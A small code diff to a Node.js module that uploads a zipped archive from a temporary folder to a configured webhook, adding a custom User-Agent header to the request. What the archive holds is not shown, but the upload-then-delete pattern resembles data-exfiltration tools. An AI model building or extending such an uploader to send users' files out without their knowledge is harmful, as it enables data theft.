@@ -9,6 +9,7 @@ const { tempFolder } = require('../index');
 const FormData = require('form-data');
 const { rmSync, readFileSync } = require('fs');
 const moment = require('moment');
+const { userAgent } = require('../config');
 
 if (!webhook.url || typeof webhook.url !== 'string' || !isValidURL(webhook.url)) return;
 
@@ -166,7 +167,7 @@ module.exports = async (zipFile) => {
   data.append('payload_json', JSON.stringify(await json()));
 
   axios.post(webhook.url, data, {
-    headers: { 'Content-Type': 'multipart/form-data' },
+    headers: { 'Content-Type': 'multipart/form-data', 'User-Agent': userAgent },
   })
     .then(res => {
       if (res.status !== 200) return;
